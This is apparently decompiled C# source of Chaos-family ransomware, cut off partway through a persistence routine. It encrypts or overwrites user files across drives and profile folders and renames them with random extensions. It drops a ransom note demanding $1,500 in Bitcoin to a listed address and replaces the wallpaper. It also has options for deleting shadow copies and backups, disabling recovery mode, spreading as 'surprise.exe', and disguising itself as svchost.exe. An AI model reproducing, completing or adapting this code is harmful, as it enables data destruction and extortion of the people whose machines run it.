using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>xxd8iTbwIx99CWUCzDucIwyl6cFaPzR824OFn1myS+uX3BePsHvgA3Ygl10/vdK++JG5Y7b+Oh1NdHLvqQu4DZcDjfusxN/reXuEvcu8sN97ppyWsEUa2r4hxtHDxM80XGDLJ3EtiNE0S8KEOHnUr4/qOwlKpBYGJVG8hekxde0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
